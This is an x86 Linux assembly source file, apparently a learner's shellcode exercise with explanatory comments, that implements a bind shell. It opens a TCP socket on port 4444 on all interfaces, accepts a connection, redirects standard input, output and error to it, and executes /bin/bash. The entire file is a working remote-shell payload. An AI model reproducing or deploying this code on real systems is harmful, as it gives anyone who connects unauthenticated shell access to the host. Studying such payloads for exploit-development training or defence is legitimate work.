global _start

section .text
_start:

  xor eax, eax
  xor ebx, ebx
  xor ecx, ecx

  mov eax, 102 ; socket system call number
  mov ebx, 1 ; subfunction number for socket.socket()
  push 0 ;protocol
  push 1 ; SOCK_STREAM, I couldn't find a list of numbers mapped to types, but I figured I would just go in order from the man page
  push 2 ; AF_INET

  mov ecx, esp ; move stack pointer into ecx

  int 0x80 ; interrupt

  mov edx,eax ; move file descriptor into edx for later


  push dword 0 ; in_addr_any (last thing in the sockaddr_in struct)
  push word 0x5C11 ; 4444 (base 10) in hex is 0x115C, so in network byte order, it's 0x5C11
  push word 2 ; AF_INET
  mov ecx, esp ; mov stack pointer into ecx for address of struct

  push byte 16 ; length of sock_addr
  push ecx ; struct
  push edx ; file descriptor returned by first socket call

  xor eax,eax
  mov eax, 102 ; socket system call
  mov ebx, 2 ; subfunction number for bind
  mov ecx, esp
  int 0x80

  push 0 ; 'backlog' argument
  push edx ; file descriptor again
  mov ecx,esp ; mov stack pointer into ecx
  mov ebx, 4 ; subfunction number for listen()
  mov eax, 102; syscall #
  int 0x80

  push 0 ; args for accept()
  push 0 ;
  push edx ; file descriptor

  mov ecx, esp

  mov ebx, 5 ; subfunction number for accept()
  mov eax, 102 ; system call number

  int 0x80 ; file descriptor is saved in eax

  ;xor ecx, ecx
  mov ebx, eax ; file descriptor into ebx because its the first arg
  mov ecx, 0; stdin
  mov eax, 63 ; syscall # for dup2()
  int 0x80

  mov eax, 63
  mov ecx, 1; stdout
  int 0x80

  mov eax, 63
  mov ecx, 2; stderr
  int 0x80

  push dword 0 ; padding/ zero termination for string
  push 0x68736162 ; "////bin/bash" backwards
  push 0x2f6e6962
  push 0x2f2f2f2f

  mov ebx, esp ; mov the first arg, filename (path to bash) into ebx
  mov edx, 0 ; envp = NULL
  mov ecx, 0 ; argv = NULL

  mov eax, 11 ; syscall # for execve
  int 0x80
